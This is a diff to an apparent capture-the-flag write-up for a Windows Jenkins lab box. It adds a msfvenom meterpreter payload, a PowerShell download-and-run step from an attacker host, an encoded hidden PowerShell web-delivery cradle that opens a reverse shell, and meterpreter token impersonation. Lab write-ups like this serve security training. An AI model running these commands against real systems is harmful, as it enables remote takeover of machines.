@@ -45,9 +45,9 @@ gobuster dir --url http://$TARGET_IP:8080 -w /usr/share/wordlists/dirb/common.tx
 
 ### Browser
 
-http://$TARGET_IP:80 => nothing interesting
+`http://$TARGET_IP:80` => nothing interesting
 
-http://$TARGET_IP:8080 => Jenkins login panel
+`http://$TARGET_IP:8080` => Jenkins login panel
 
 Interesting request headers:
 
@@ -134,5 +134,88 @@ type C:\Users\bruce\Desktop\user.txt
 ```sh
 # attacker
 
+# generate payload
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f exe -o enki.exe
+
+# serve payload
+python3 -m http.server
+
+# setup handler
+msfconsole
+use exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST $TARGET_IP
+set LPORT 9000
+run
 ```
+
+```batch
+REM  target
+
+REM  download reverse shell
+POWERSHELL "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER_IP:8000/enki.exe','enki.exe')"
+
+REM  start reverse shell
+POWERSHELL Start-Process "enki.exe"
+```
+
+`exploit/multi/handler` wouldn't work...just hung. Looked up writeup
+
+```sh
+# attacker
+
+msfconsole
+use exploit/muilti/script/web_delivery
+set LHOST $ATTACKER_IP
+set LPORT 9000
+set target 2
+run
+```
+
+```ps1
+# generated from metasploit, ran on target machine
+
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAGYAWgBSAGsAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbABmAFoAUgBrAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbABmAFoAUgBrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANgAuADEALgAxADgAMQA6ADgAMAA4ADAALwAyAGoATABiAGQAcABnAFkAWABSAG8ALwBIAGQAeQBqAE0AQgBzAGoAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYALgAxAC4AMQA4ADEAOgA4ADAAOAAwAC8AMgBqAEwAYgBkAHAAZwBZAFgAUgBvACcAKQApADsA
+
+# reverse shell popped on attacker
+```
+
+```sh
+# attacker, meterpreter shell
+
+execute -f cmd.exe -c -i
+```
+
+```batch
+REM  attacker, meterpreter cmd
+whoami /priv
+```
+
+```sh
+# attacker, meterpreter shell
+
+load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators"
+getuid
+
+ps
+migrate 668
+
+execute -f cmd.exe -c -i
+type C:\Windows\System32\Config\root.txt
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
